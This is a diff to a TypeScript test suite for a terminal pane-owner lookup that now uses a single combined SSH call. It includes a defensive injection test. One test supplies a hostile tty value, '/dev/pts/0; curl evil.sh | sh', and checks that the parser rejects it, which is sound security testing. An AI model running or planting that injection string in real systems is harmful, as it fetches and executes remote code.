@@ -80,12 +80,20 @@ async function manager(opts: { tmux?: string | null; sshRemote?: unknown } = {})
   return mgr
 }
 
-/** The default healthy script: tmux answers the format, `ps` answers the tty listing. */
+/**
+ * The default healthy answers. Local: tmux answers the format, `ps` answers the tty listing.
+ * SSH: the ONE combined exec answers the fenced identity line plus the `ps` rows in one stdout
+ * (issue #460) — the reply shape `remotePaneOwnerCombinedArgs`'s script really produces, proven
+ * against a real sh + tmux in `agents/pane-owner.test.ts`.
+ */
 function healthy(file: string, args: string[]): { stdout: string } {
-  if (args.includes(PANE_OWNER_FMT) || args.join(' ').includes(PANE_OWNER_FMT)) {
+  if (file === '/usr/bin/ssh') {
+    return { stdout: `##NTPANE 2485382|${TTY}|node\n${PS_OUT}\n` }
+  }
+  if (args.includes(PANE_OWNER_FMT)) {
     return { stdout: `2485382|${TTY}|node\n` }
   }
-  if (file === 'ps' || args.join(' ').includes('ps ')) return { stdout: PS_OUT }
+  if (file === 'ps') return { stdout: PS_OUT }
   return { stdout: '' }
 }
 
@@ -126,37 +134,40 @@ describe('PtyManager.paneOwner', () => {
     })
   })
 
-  it('SSH: both round-trips ride the project ControlMaster, and the local socket is never touched', async () => {
+  it('SSH: ONE round-trip rides the project ControlMaster, and the local socket is never touched', async () => {
+    // One exec, not two (issue #460): under a saturated/dead master every exec is a full ssh
+    // LOGIN, and two of them did not fit the delivery gate's 2s probe budget — a live agent pane
+    // then read as unknown, persistently.
     const mgr = await manager({
       sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
     })
     const owner = await mgr.paneOwner(NODE)
 
-    expect(calls).toHaveLength(2)
-    expect(calls.every((c) => c.file === '/usr/bin/ssh')).toBe(true)
-    expect(calls.every((c) => c.args.includes('ControlPath=/tmp/cm-abc'))).toBe(true)
+    expect(calls).toHaveLength(1)
+    expect(calls[0].file).toBe('/usr/bin/ssh')
+    expect(calls[0].args.includes('ControlPath=/tmp/cm-abc')).toBe(true)
+    const script = calls[0].args.at(-1) as string
     // The REMOTE socket, never the local one — a local `nt-<id>` would be another machine's session.
-    expect(calls[0].args.at(-1)).toContain(`tmux -L ${RMT_TMUX_SOCKET} display-message`)
-    expect(calls.join(' ')).not.toContain(`-L ${TMUX_SOCKET} `)
-    expect(calls[1].args.at(-1)).toBe(
-      `ps '-ww' '-o' 'pid=' '-o' 'pgid=' '-o' 'stat=' '-o' 'args=' '-t' '${TTY}'`
-    )
+    expect(script).toContain(`tmux -L ${RMT_TMUX_SOCKET} display-message`)
+    expect(script).not.toContain(`-L ${TMUX_SOCKET} `)
+    // Both halves of the read live in the one script: the fenced identity, then the ps rows.
+    expect(script).toContain("printf '%s\\n'")
+    expect(script).toContain('ps -ww -o pid= -o pgid= -o stat= -o args= -t "$tty"')
     expect(owner).toMatchObject({ tty: TTY, argv: [expect.stringContaining('claude'), 'rg --files'] })
   })
 
-  it('SSH: a tty the remote host printed back is quoted, and a hostile one is never run at all', async () => {
-    script.answer = (file, args) => {
-      if (args.join(' ').includes(PANE_OWNER_FMT)) {
-        return { stdout: `42|/dev/pts/0; curl evil.sh | sh|node\n` }
-      }
-      return { stdout: PS_OUT }
-    }
+  it('SSH: a hostile tty in the reply is refused by the parser — never adopted as an owner', async () => {
+    // The tty no longer crosses back into OUR command line at all (it is expanded quoted inside
+    // the remote script), so the defense the old two-trip read applied at argv-build time now
+    // lives in `parseCombinedPaneOwner`: an identity whose tty `isSafeTty` refuses answers null.
+    script.answer = () => ({
+      stdout: `##NTPANE 42|/dev/pts/0; curl evil.sh | sh|node\n${PS_OUT}\n`
+    })
     const mgr = await manager({
       sshRemote: { conn: { host: 'h', user: 'u' }, controlPath: '/tmp/cm-abc' }
     })
 
     expect(await mgr.paneOwner(NODE)).toBeNull()
-    // The tmux read happened; the `ps` was never built, so nothing hostile reached a command line.
     expect(calls).toHaveLength(1)
   })
 
